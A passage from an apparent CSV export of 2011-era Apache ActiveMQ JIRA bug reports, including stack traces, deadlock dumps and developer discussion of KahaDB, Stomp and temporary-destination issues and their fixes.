    at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)null
    at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)null

    at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:216)null
    at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)null
    at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:222)null
    at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:204)null      
    at java.lang.Thread.run(Thread.java:619)null

=======================================================================================


2011-09-07 12:43:41,028 ERROR [cursors.FilePendingMessageCursor] [1315421994681] : [ActiveMQ Transport: tcp:///134.242.171.26:35469]
 Caught an Exception adding a message: ActiveMQObjectMessage {commandId = 82, responseRequired = false, messageId = ID:lgvn-330
53-1315415867932-0:19:1:1:78, originalDestination = null, originalTransactionId = null, producerId = ID:lgvn-33053-131541586793
2-0:19:1:1, destination = queue://snTableQueue_CHF, transactionId = null, expiration = 0, timestamp = 1315424620840,
 arrival = 0, brokerInTime = 1315424620881, brokerOutTime = 0, correlationId = null, replyTo = null, persistent = false, type = null
, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = org.apache.activemq.util.ByteSequence@d42d49, marshalledProperties = org.apache.activemq.util.ByteSequence@1e91c40, dataStructure = null, redeliveryCounter = 0, size = 0, properties = {TO=0, FROM=37, HOST=134.242.171.26, trigger_name=com.foo.receiver.beans.ACTData, version=3.4}, readOnlyProperties = false, readOnlyBody = false, droppable = false} first to FilePendingMessageCursor
java.lang.RuntimeException: java.lang.NullPointerExceptionnull
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:460)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:226)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:196)null
    at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1603)null  
    at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:715)null
    at org.apache.activemq.broker.region.Queue.send(Queue.java:647)null
    at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:409)null
    at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:543)null
    at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBrok
er.java:301)null
    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null  
    at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)null
    at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:306)null
    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null    
    at org.apache.activemq.security.AuthorizationBroker.send(AuthorizationBroker.java:192)null
    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null
    at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)null      
    at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:468)null
    at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681)null
    at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316)null

    at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)null
    at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)null  
    at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)null
    at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:216)null      
    at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)null    
    at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:222)null
    at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:204)null  
    at java.lang.Thread.run(Thread.java:619)nullCaused by: java.lang.NullPointerExceptionnull    
    at org.apache.activemq.store.kahadb.plist.PListStore$1.execute(PListStore.java:229)null  
    at org.apache.kahadb.page.Transaction.execute(Transaction.java:760)null  
    at org.apache.activemq.store.kahadb.plist.PListStore.getPList(PListStore.java:225)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:457)null  

        ... 26 morenull ","Solaris, embedded broker, file cursor enabled",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,43775,,,Mon Sep 19 09:09:57 UTC 2011,,,,,,,,,,,"0|i0agsv:",58995,,,,,,,,,,,,,,,,,,,,,"13/Sep/11 18:26;gtully;what jdk are you using and on what platform. The first stack trace is odd, as if the system property ""line.separator"" is null!.
{code}	lineSeparator =	(String) java.security.AccessController.doPrivileged(
               new sun.security.action.GetPropertyAction(""line.separator""));{code};;;","13/Sep/11 18:37;gtully;just to validate: this is on a current snapshot?
I am at a loss here, as the initialization looks safe to me. see:org.apache.activemq.store.kahadb.plist.PListStore#intialize
in: http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/store/kahadb/plist/PListStore.java?view=markup;;;","14/Sep/11 15:43;jrichartz;I agree, the first stack trace does look odd.

Standard Sun/Oracle jdk on Solaris:

weizen> java -version
java version ""1.6.0_19""
Java(TM) SE Runtime Environment (build 1.6.0_19-b04)
Java HotSpot(TM) Server VM (build 16.2-b04, mixed mode)

weizen> uname -a
SunOS weizen 5.10 Generic_138889-07 i86pc i386 i86pc
stargus@weizen> 
;;;","14/Sep/11 15:49;jrichartz;The version of 5.6 was retrieved from https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.6-SNAPSHOT/

as:

apache-activemq-5.6-SNAPSHOT-bin.tar.gz 

being the version posted as of 7 Sept.	  
;;;","14/Sep/11 16:51;gtully;hmm. thanks for the detail. I need to try and reproduce. Do you have a junit test case you can share? If not, is it stomp or openwire and what setup, how many concurrent producers etc. thanks.;;;","14/Sep/11 17:45;jrichartz;I don't have a test case that directly exposes this issue, but need to put one together. I'll work on that.

It's not stomp, so I guess it's openwire. There's perhaps 20 concurrent producers, each emits a burst of large messages once per hour and, of course, at the same time.

The producers create a connection like this:

			QueueConnectionFactory queueFactory = (QueueConnectionFactory)getJndiElement(m_dataChannelQueueConnectionFactoryJndiName);
			log(Level.TRACE, ""QueueConnectionFactory successfully established"");
			Queue queue = (Queue) getJndiElement(queueName);

			m_connection = queueFactory.createQueueConnection(getJndiUser(), getJndiPassword());
			log(Level.TRACE, ""QueueConnection created"");
			m_connection.setClientID(""DataChannel_"" + m_nodeId + ""_"" + queueName +""_"" + messageNumber.toString());
			messageNumber.incrementAndGet();
			m_queueSession = m_connection.createQueueSession(false, Session.AUTO_ACKNOWLEDGE);
			m_queueSender = m_queueSession.createSender(queue);
			log(Level.TRACE, ""QueueSession created: "" + m_queueSender.toString());
			m_queueSender.setDeliveryMode(DeliveryMode.NON_PERSISTENT);
;;;","16/Sep/11 10:23;gtully;part of the problem is that the plist store initialisation was setting the init-done flag early, such that in the case of the first exception above, the store was considered initialised. I have resolved[1] that so in the event of a failed attempt it will retry. the reason for the first exception is still a misery though.
[1] http://svn.apache.org/viewvc?rev=1171487&view=rev;;;","16/Sep/11 22:05;jrichartz;Regarding the observation that it appears the line.separator property is  null in the stack traces ... This is consistent with the discovery that the message handling thread is in a context where the system properties are not available.

In order to ensure the Oracle jdbc driver can find tnsnames.ora, it was necessary to set the magic oracle.net.tns_admin property during message handling.

I just ran a test to see if line.separator property had a value in the message handing thread and it is null, so it seems this is the reason for the curious appearance of the stack traces.;;;","19/Sep/11 09:09;gtully;Some more control of when the temp store is initialised can help here so that the execution context can be specific.

With http://svn.apache.org/viewvc?rev=1172528&view=rev it is possible to configure a temp store(plistStore) with lazyInit=""false"" so that it gets initaliszed on broker start rather than when first used to spool messages to disk.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Temporary destinations' DestinationInfo commands over VM transport prevent connection closure,AMQ-3488,12521829,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,dretzlaff,dretzlaff,07/Sep/11 22:27,23/Apr/12 17:48,14/Jul/23 05:43,11/Sep/11 19:56,5.5.0,,,,,5.6.0,,,Transport,,,,0,,,,,,,,,"ActiveMQTempDestinations hold onto the source connection that created them. When the source connection is closed, its temporary destinations are deleted. Unfortunately, DestinationInfo commands convey the destination object with its source connection to all other connections on the same VMTransportServer. Hence when these other connections are closed, they attempt to delete the source connection's temporary destination.

Note that enabling marshaling on the VM transport works around this bug because destination serialization and deserialization does not maintain the source connection reference.

This bug was not present in 5.4.2.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Sep/11 22:28;dretzlaff;TempQueueDeleteOnCloseTest.java;https://issues.apache.org/jira/secure/attachment/12493522/TempQueueDeleteOnCloseTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60089,,,Mon Apr 23 17:48:36 UTC 2012,,,,,,,,,,,"0|i0aiy7:",59343,Regression,,,,,,,,,,,,,,,,,,,,"07/Sep/11 22:28;dretzlaff;The attached test case demonstrates this bug by having a consumer active on the source connection, which causes a ""Consumer is consuming from the temporary destination"" exception when a separate connection is created and closed.
;;;","11/Sep/11 19:56;tabish;Fixed in trunk, thanks for the great test case.;;;","23/Apr/12 17:48;djohle;I have some additional notes about some other side effects I've encountered that I can attribute to this same bug.  Just posting them here in case anyone else not running 5.6.0 yet is running into them and trying to figure out what is going on.

I noticed that, when using a temporary destination and then closing a connection and subsequently receiving the ""Consumer is consuming..."" exception, the consumer for the queue I closed a connection to was left dangling.

That is, I start up my application with X amount of consumers and look at the queue via JMX under org.apache.activemq->myBrokerName->Queue->myQueuName->Attributes->Subscriptions
and see X amount subscriptions to that queue as expected.  I then instruct my application to shut down Y amount of consumers, and the Subscriptions count remains at X instead of the expected value of X - Y = Z.

If I disable the portion of my application that uses the temporary queue, then no exceptions happen, and the above shutdown test does cause the Subscriptions count to drop to Z accordingly.


What's worse is that it's not just excess JMX ObjectNames left behind, but the actual consumer subscriptions they relate to are also still there and registered with ActiveMQ / bound to that queue as MessageListeners.  That can be verified via JMX as well, under org.apache.activemq->myBrokerName->Subscription->Non-Durable->Queue->myQueueName.

So what happens next is...

I then trigger my application to produce a bunch of messages into myQueueName.  Most of them are consumed by the remaining Z consumers, but a certain number of them just get stuck in the queue.  And not just any number, but precisely the number Y * prefetchSize.

If I restart my entire application the messages then get re-delivered to the fresh consumers and flushed out of myQueueName.  That is, unless I don't get to it in time, at which point they expire and end up in the DLQ instead.

Again, disabling the use of temporary qeueus avoids this issue.  The problem, of course, is that I need the temps for proper app functionality!


I also tested this scenario with the current 5.6.0-SNAPSHOT and can confirm that it does indeed resolve the issue.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Possible Stomp deadlock,AMQ-3481,12520935,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,dejanb,dejanb,31/Aug/11 15:59,19/Oct/11 14:56,14/Jul/23 05:43,13/Oct/11 14:55,5.x,,,,,5.6.0,,,,,,,0,,,,,,,,,"When subscribing with receipt to the queue that already contains the messages, we can end up dead locking sending ack back to the broker and response to the stomp client.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14542,,,Wed Oct 19 14:56:28 UTC 2011,,,,,,,,,,,"0|i0aiyv:",59346,,,,,,,,,,,,,,,,,,,,,"01/Sep/11 08:30;dejanb;Fixed with svn revision 1163940;;;","14/Sep/11 17:27;gtully;The inactivity monitor is still a problem with disconnects. Wonder should there be an inactivity monitor on the broker side at all?
{code}Found one Java-level deadlock:
=============================
""BrokerService[localhost] Task-3"":
  waiting to lock monitor 10938cc40 (object 7dde83ee8, a org.apache.activemq.transport.AbstractInactivityMonitor$1),
  which is held by ""ActiveMQ Transport: tcp:///127.0.0.1:61117""
""ActiveMQ Transport: tcp:///127.0.0.1:61117"":
  waiting to lock monitor 1095750b0 (object 7dde83f18, a java.lang.Object),
  which is held by ""BrokerService[localhost] Task-3""
Java stack information for the threads listed above:
===================================================
""BrokerService[localhost] Task-3"":
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:216)
	- waiting to lock <7dde83ee8> (a org.apache.activemq.transport.AbstractInactivityMonitor$1)
	at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:86)
	at org.apache.activemq.transport.stomp.StompSubscription.onMessageDispatch(StompSubscription.java:78)
	at org.apache.activemq.transport.stomp.ProtocolConverter.onActiveMQCommand(ProtocolConverter.java:749)
	at org.apache.activemq.transport.stomp.StompTransportFilter.oneway(StompTransportFilter.java:63)
	at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:242)
	- locked <7dde83f00> (a java.util.concurrent.atomic.AtomicBoolean)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
	- locked <7dde83f18> (a java.lang.Object)
	at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1281)
	at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:830)
	at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:866)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)
""ActiveMQ Transport: tcp:///127.0.0.1:61117"":
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
	- waiting to lock <7dde83f18> (a java.lang.Object)
	at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1281)
	at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:830)
	at org.apache.activemq.broker.TransportConnection.dispatchSync(TransportConnection.java:790)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:183)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:216)
	- locked <7dde83ee8> (a org.apache.activemq.transport.AbstractInactivityMonitor$1)
	at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:86)
	at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:169)
	at org.apache.activemq.transport.stomp.ProtocolConverter.onStompDisconnect(ProtocolConverter.java:715)
	at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:226)
	at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:75)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:222)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:204)
	at java.lang.Thread.run(Thread.java:680)
Found 1 deadlock.{code};;;","07/Oct/11 15:22;tabish;Fix applied in trunk;;;","11/Oct/11 23:49;tabish;Still some problems here, needs more work.;;;","13/Oct/11 14:55;tabish;Fix applied in trunk, lets see if this one does it.;;;","19/Oct/11 14:56;tabish;Test passing consistently in hudson.  Fix seems to have nailed it.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The documentation should point-out ActiveMQ's currently limitations with XA,AMQ-3479,12520855,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,ssmith@atlassian.com,ssmith@atlassian.com,30/Aug/11 23:21,31/Aug/11 12:28,14/Jul/23 05:43,31/Aug/11 12:28,5.5.0,,,,,,,,Documentation,,,,0,,,,,,,,,"The documentation [explicitly recommends|http://activemq.apache.org/should-i-use-xa.html] using XA transactions for multiple resources:
{quote}
If you are using more than one resource; e.g. reading a JMS message and writing to a database, you really should use XA - its purpose is to provide atomic transactions for multiple transactional resources.
{quote}
However it fails to mention that XA support in ActiveMQ [does not support|AMQ-3022] suspending/resuming transactions, e.g. with Springs Propagation.REQUIRES_NEW.
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3022,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,63035,,,Wed Aug 31 12:28:08 UTC 2011,,,,,,,,,,,"0|i0ebxb:",81694,,,,,,,,,,,,,,,,,,,,,"31/Aug/11 12:28;tabish;Added a note to the XA section of the specified page.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Messages (possibly) stuck and pending messages count showing high number of pending message which do not get sent to a consumer.,AMQ-3473,12520013,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,matsharpe,matsharpe,24/Aug/11 19:45,28/Mar/12 09:45,14/Jul/23 05:43,28/Mar/12 09:45,5.5.0,,,,,5.6.0,,,Message Store,,,,1,,,,,,,,,"Two brokers, each with a network connection to the other. We have two producers producing persistent messages to a single queue at a rate of 20-50/second. There is a single consumer. All clients prefer the primary broker.

The consumer is 'bursty' - i.e. it grabs 5000 messages and then processes them. During processing, new messages build up on the broker.

If the primary broker is restarted we will see it come back with, as you would expect, with a number of pending messages. This message count never fully returns to 0 even if the producers are stopped and browsing the queue through the GUI shows either no messages or only messages that were produced since the restart.


I have turned on Kaha debugging and, after the initial restart, we see the following during every checkpoint:
 [eckpoint Worker] TRACE MessageDatabase                - Last update: 3974:2450180, full gc candidates set: [3950, 3951, 3973, 3974]
...
 [eckpoint Worker] TRACE MessageDatabase                - gc candidates after dest:1:MyQueue, [3951, 3973]
...
 [eckpoint Worker] TRACE MessageDatabase                - gc candidates: [3951, 3973]
 [eckpoint Worker] TRACE MessageDatabase                - not removing data file: 3951 as contained ack(s) refer to referenced file: [3950, 3951]
 [eckpoint Worker] DEBUG MessageDatabase                - Cleanup removing the data files: [3973]
(I assume that is supposed to say '[Checkpoint Worker]', incidentally)

After the second restart we will see many:
 [0.8.0.200:47300] WARN  MessageDatabase                - Duplicate message add attempt rejected. Destination: MyQueue, Message id: ID:node001-58675-1314038640553-0:17:1:1:470776

Followed by:
 [eckpoint Worker] TRACE MessageDatabase                - Last update: 3974:13515407, full gc candidates set: [3950, 3951, 3974]
...
 [eckpoint Worker] TRACE MessageDatabase                - gc candidates after dest:1:MyQueue, [3951]
...
 [eckpoint Worker] TRACE MessageDatabase                - gc candidates: [3951]
 [eckpoint Worker] DEBUG MessageDatabase                - Cleanup removing the data files: [3951]



This is very similar, if not the same, to AMQ-2955. I have tried setting 'useCache=false' but this does not rectify the issue. This could also be a similar issue to AMQ-3281.

I will attach a config. Please advise if you would like me to enable further debugging.

I don't currently have a test harness that replicates this issue and due to the fact this is only happening in our production environment, I'm unable to verify reliably whether messages are being lost, delayed or if this is purely a stats issue.


","Ubuntu 11.04 (64-bit)

Java(TM) SE Runtime Environment (build 1.6.0_24-b07)
Java HotSpot(TM) 64-Bit Server VM (build 19.1-b02, mixed mode)
",andreaja,lichtin,matsharpe,oseymen,tnarake,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3576,,,,,,"24/Aug/11 19:48;matsharpe;activemq.xml;https://issues.apache.org/jira/secure/attachment/12491539/activemq.xml",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,63852,,,Wed Mar 28 09:45:17 UTC 2012,,,,,,,,,,,"0|i0aizj:",59349,,,,,,,,,,,,,,,,,,,,,"27/Mar/12 12:20;gtully;There is a problem here with the enqueue counter. If a duplicate message send occurs across a network connector and the message has not been dispatched. The store will add the message to the journal but the index update will recognize the duplicate. It updates the index to reference the last journal insert, but the enqueue counter is not decremented to reflect the duplicate.

The duplicate send can occur if the connection or broker dies after a send but before a reply is received. The message remains unacked and gets redispatched. The redelivery counter will be incremented to reflect the resend in this case.

In 5.6, (https://issues.apache.org/jira/browse/AMQ-3576) there is an optional boolean transportConnector.auditNetworkProducers attribute that can be used to add a producer audit for a network connector. This will suppress the duplicate send in this case. It is disabled by default because it can prevent legit duplicate messages from non conduit topics and virtual destinations from propagating across the network.

The producer audit is a good solution but in the event that the audit cache is exceeded, the duplicate detection by the store should be reflected in the destination enqueue statistic.;;;","27/Mar/12 12:29;gtully;The auditNetworkProducers attribute from AMQ-3576 will help avoid this issue.;;;","28/Mar/12 09:45;gtully;fix for the enqueue and message count statistic in the event of ""Duplicate message add attempt rejected"" @ http://svn.apache.org/viewvc?rev=1306228&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
IndexOutOfBounds in kahadb with large number of subscriptions and pending messages,AMQ-3466,12519823,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,tabish,tabish,23/Aug/11 13:24,20/Sep/11 10:42,14/Jul/23 05:43,23/Aug/11 13:35,5.5.0,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"When there are several durable subscribers each with a large number of pending messages to be acked the an error occurs, as well as some others involving ArrayIndexOutOfBoundsExceptions and NullPointerExceptions while reading or writing the chunk stream.

{noformat}
javax.jms.JMSException: STORE COMMIT FAILED: Transaction rolled back.
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1287)
	at org.apache.activemq.TransactionContext.syncSendPacketWithInterruptionHandling(TransactionContext.java:704)
	at org.apache.activemq.TransactionContext.commit(TransactionContext.java:299)
	at org.apache.activemq.ActiveMQSession.commit(ActiveMQSession.java:560)
	at org.apache.activemq.process.TopicWithManySelectorsTest.sendNotification(TopicWithManySelectorsTest.java:126)
	at org.apache.activemq.process.TopicWithManySelectorsTest.test(TopicWithManySelectorsTest.java:85)
	at org.apache.activemq.process.TopicWithManySelectorsTest.testMass(TopicWithManySelectorsTest.java:42)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at junit.framework.TestCase.runTest(TestCase.java:168)
	at junit.framework.TestCase.runBare(TestCase.java:134)
	at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:90)
	at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:96)
	at junit.framework.TestResult$1.protect(TestResult.java:110)
	at junit.framework.TestResult.runProtected(TestResult.java:128)
	at junit.framework.TestResult.run(TestResult.java:113)
	at junit.framework.TestCase.run(TestCase.java:124)
	at junit.framework.TestSuite.runTest(TestSuite.java:232)
	at junit.framework.TestSuite.run(TestSuite.java:227)
	at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:79)
	at org.junit.runner.JUnitCore.run(JUnitCore.java:137)
	at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:94)
	at com.intellij.rt.execution.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:196)
	at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:65)
Caused by: javax.transaction.xa.XAException: STORE COMMIT FAILED: Transaction rolled back.
	at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:77)
	at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:173)
	at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103)
	at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:424)
	at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:311)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
	at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:219)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)
Caused by: javax.transaction.xa.XAException: POST COMMIT FAILED
	at org.apache.activemq.transaction.Transaction.doPostCommit(Transaction.java:182)
	at org.apache.activemq.transaction.Transaction$2.call(Transaction.java:54)
	at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:303)
	at java.util.concurrent.FutureTask.run(FutureTask.java:138)
	at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:768)
	at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:264)
	at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:72)
	... 14 more
Caused by: java.lang.ArrayIndexOutOfBoundsException
	at java.lang.System.arraycopy(Native Method)
	at org.apache.kahadb.page.Transaction$2.read(Transaction.java:494)
	at java.io.DataInputStream.readFully(DataInputStream.java:178)
	at java.io.DataInputStream.readFully(DataInputStream.java:152)
	at org.apache.activemq.store.kahadb.MessageDatabase$HashSetStringMarshaller.readPayload(MessageDatabase.java:2352)
	at org.apache.activemq.store.kahadb.MessageDatabase$HashSetStringMarshaller.readPayload(MessageDatabase.java:2335)
	at org.apache.kahadb.index.BTreeNode$Marshaller.readPayload(BTreeNode.java:201)
	at org.apache.kahadb.index.BTreeNode$Marshaller.readPayload(BTreeNode.java:147)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:406)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:361)
	at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:262)
	at org.apache.kahadb.index.BTreeNode.getChild(BTreeNode.java:225)
	at org.apache.kahadb.index.BTreeNode.getLeafNode(BTreeNode.java:672)
	at org.apache.kahadb.index.BTreeNode.get(BTreeNode.java:558)
	at org.apache.kahadb.index.BTreeIndex.get(BTreeIndex.java:184)
	at org.apache.activemq.store.kahadb.MessageDatabase.removeAckLocation(MessageDatabase.java:1642)
	at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:1051)
	at org.apache.activemq.store.kahadb.MessageDatabase$15.execute(MessageDatabase.java:890)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
